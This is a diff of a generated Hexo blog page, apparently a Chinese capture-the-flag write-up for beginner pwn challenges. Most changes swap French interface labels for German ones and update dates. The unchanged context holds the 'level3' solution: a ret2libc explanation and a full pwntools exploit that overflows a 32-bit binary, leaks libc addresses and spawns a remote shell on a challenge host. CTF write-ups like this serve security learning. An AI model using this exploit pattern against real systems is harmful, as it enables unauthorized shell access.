@@ -138,8 +138,7 @@
 <meta property="og:image" content="http://betterlh.github.io/2019/08/17/攻防世界-新手/guess_num-3.GIF">
 <meta property="og:image" content="http://betterlh.github.io/2019/08/17/攻防世界-新手/guess_num-1.GIF">
 <meta property="og:image" content="http://betterlh.github.io/2019/08/17/攻防世界-新手/level3-1.GIF">
-<meta property="og:image" content="http://betterlh.github.io/2019/08/17/攻防世界-新手/level3-2.GIF">
-<meta property="og:updated_time" content="2019-08-25T15:06:41.347Z">
+<meta property="og:updated_time" content="2019-09-29T12:07:48.194Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界-新手">
 <meta name="twitter:description" content="参考的一系列文章： https://blog.csdn.net/weixin_44319142/article/details/89077831感谢！后面每题也根据不同的writeup写出来的 get_shell直接运行就可以了，看代码就发现会直接运行system函数，所以直接运行就ok直接拿到权限了，看来还是要写 exp，远程连接下cyberpeace{057e59b4709123764babf">
@@ -256,7 +255,7 @@
 
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Accueil</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
 
   </li>
         
@@ -273,7 +272,7 @@
 
     
 
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>A propos</a>
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>Über</a>
 
   </li>
         
@@ -307,7 +306,7 @@
 
     
 
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Kategorien</a>
 
   </li>
         
@@ -324,7 +323,7 @@
 
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
 
   </li>
         
@@ -429,7 +428,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posté le</span>
+                <span class="post-meta-item-text">Veröffentlicht am</span>
               
 
               
@@ -453,7 +452,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-08-25 23:06:41" itemprop="dateModified" datetime="2019-08-25T23:06:41+08:00">2019-08-25</time>
+                <time title="Updated at: 2019-09-29 20:07:48" itemprop="dateModified" datetime="2019-09-29T20:07:48+08:00">2019-09-29</time>
               
             
           </span>
@@ -467,7 +466,7 @@
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">In</span>
+                <span class="post-meta-item-text">in</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -574,12 +573,11 @@
 <p>参考：<br>链接：<a href="https://www.jianshu.com/p/0bc6c65addfd" target="_blank" rel="noopener">https://www.jianshu.com/p/0bc6c65addfd</a></p>
 <hr>
 <h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p><img src="/2019/08/17/攻防世界-新手/level3-1.GIF" alt=""><br>32位</p>
-<p><img src="/2019/08/17/攻防世界-新手/level3-2.GIF" alt=""><br>题目的代码很简洁，主要就两行<br>也没有system函数，和其他获取falg的函数。应该是要用其他的函数，来间接获取的system的地址。<br>read函数这里可以溢出，</p>
+<p>题目的代码很简洁，主要就两行<br>也没有system函数，和其他获取falg的函数。应该是要用其他的函数，来间接获取的system的地址。<br>read函数这里可以溢出，</p>
 <p>参考<a href="https://www.jianshu.com/p/4b3fd7328f20" target="_blank" rel="noopener">https://www.jianshu.com/p/4b3fd7328f20</a></p>
 <h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>无libc文件，无sys函数，无binsh字符串，有read和write函数，很明显的<strong>ret2libc</strong><br>原理：system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。用工具来找到对应的libc文件</p>
 <p>具体思路：<br>第一次溢出返回到write函数执行write(1,write_got,4)得到write的真实地址，计算得到system跟”/bin/sh”的真实地址，然后再返回到vulnerable_function函数，第二次回到溢出点，覆盖返回地址到system执行system(“/bin/sh”)</p>
 <p>exp<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,<span class="number">44145</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vul_func = <span class="number">0x0804844b</span> <span class="comment">#这里用main_addr = elf.symbols['main'] 返回主函数也是可以滴</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">140</span> + p32(plt_write) + p32(vul_func) + p32(<span class="number">1</span>) + p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)<span class="comment">#这句千万不能漏了，逻辑出问题就会执行不了，这句的意思就是调用执行嘛，然后就把payload写进去就可以达到目的哟</span></span><br><span class="line">p.send(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">offset = write_addr - libc.dump(<span class="string">'write'</span>)  <span class="comment">##感觉这个就像是libc_base，libc的基地址，我这么理解的</span></span><br><span class="line">system_addr = offset + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = offset + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">140</span> + p32(system_addr) + p32(plt_read) + p32(binsh_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -669,10 +667,10 @@
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table Des Matières
+            Inhaltsverzeichnis
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Ensemble
+            Übersicht
           </li>
         </ul>
       
@@ -692,8 +690,8 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">79</span>
-                    <span class="site-state-item-name">articles</span>
+                    <span class="site-state-item-count">82</span>
+                    <span class="site-state-item-name">Artikel</span>
                   </a>
                 </div>
               
@@ -723,8 +721,10 @@
                     
                       
                     
-                    <span class="site-state-item-count">9</span>
-                    <span class="site-state-item-name">categories</span>
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">Kategorien</span>
                   </a>
                 </div>
               
@@ -793,7 +793,7 @@
 </div>
 
 
-  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
 
 
 
@@ -801,7 +801,7 @@
 
 
 
-  <div class="theme-info">Thème – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.7.0</div>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v6.7.0</div>
 
 
 
